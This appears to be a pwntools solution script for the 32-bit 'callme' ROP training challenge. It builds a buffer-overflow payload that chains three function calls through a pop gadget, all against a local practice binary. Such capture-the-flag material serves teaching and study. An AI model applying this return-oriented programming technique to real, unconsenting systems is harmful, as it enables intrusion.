#!/usr/bin/env python3

from pwn import *

elf = ELF('./callme32')
p = process('./callme32')

callme_one_addr = 0x00000000000080484f6
callme_two_addr = 0x0000000000008048556
callme_three_addr = 0x00000000000080484e6
pop_esi_edi_ebp = 0x080487f9

payload = b'A'*44

payload += p32(callme_one_addr)
payload += p32(pop_esi_edi_ebp)
payload += p32(0xdeadbeef)
payload += p32(0xcafebabe)
payload += p32(0xd00df00d)

payload += p32(callme_two_addr)
payload += p32(pop_esi_edi_ebp)
payload += p32(0xdeadbeef)
payload += p32(0xcafebabe)
payload += p32(0xd00df00d)

payload += p32(callme_three_addr)
payload += p32(pop_esi_edi_ebp)
payload += p32(0xdeadbeef)
payload += p32(0xcafebabe)
payload += p32(0xd00df00d)

p.recvuntil('> ')
p.sendline(payload)

print(p.recvall())
